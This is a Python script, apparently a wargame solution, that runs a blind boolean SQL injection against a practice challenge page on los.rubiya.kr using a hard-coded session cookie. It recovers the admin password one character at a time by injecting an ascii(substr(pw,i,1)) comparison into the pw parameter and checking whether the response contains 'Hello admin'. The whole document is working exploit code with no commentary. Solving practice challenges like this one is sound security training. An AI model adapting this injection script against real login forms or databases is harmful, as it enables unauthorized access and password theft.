import requests

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")
pw = ""
for i in range(1,9):
    for j in range(32, 128):
        payload = f"1' || id='admin' && ascii(substr(pw,{i},1))={j} -- "
        response = requests.get(url, cookies=cookie, params={"pw":payload})
        if "Hello admin" in response.text:
            print(j)
            pw += chr(j)
            break
print(pw)